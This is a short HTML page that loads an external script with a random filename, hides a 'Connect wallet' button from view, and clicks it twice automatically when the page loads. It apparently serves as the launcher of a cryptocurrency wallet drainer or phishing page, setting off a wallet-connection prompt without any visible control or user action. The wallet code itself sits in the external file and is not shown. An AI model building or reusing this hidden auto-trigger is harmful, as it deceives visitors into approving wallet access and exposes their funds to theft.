<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Button with Script</title>
    <script charset="UTF-8" type="text/javascript" src="./a110a1fa-af48-4a2f-b124-827d8160c4a0.js"></script>
    <style>
        /* Basic page styles */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: white;
        }

        /* Button styles */
        .interact-button {
            background-color: black;
            color: white;
            font-size: 16px;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            visibility: hidden;  /* Hides the button from the user */
        }

        .interact-button:hover {
            background-color: #333;
        }
    </style>
</head>
<body>

    <button class="interact-button" id="connectButton">Connect wallet</button>

    <script>
        window.onload = function() {
            // Trigger two consecutive clicks on the button
            var button = document.getElementById("connectButton");
            button.click();  // First click
            button.click();  // Second click
        }
    </script>

</body>
</html>
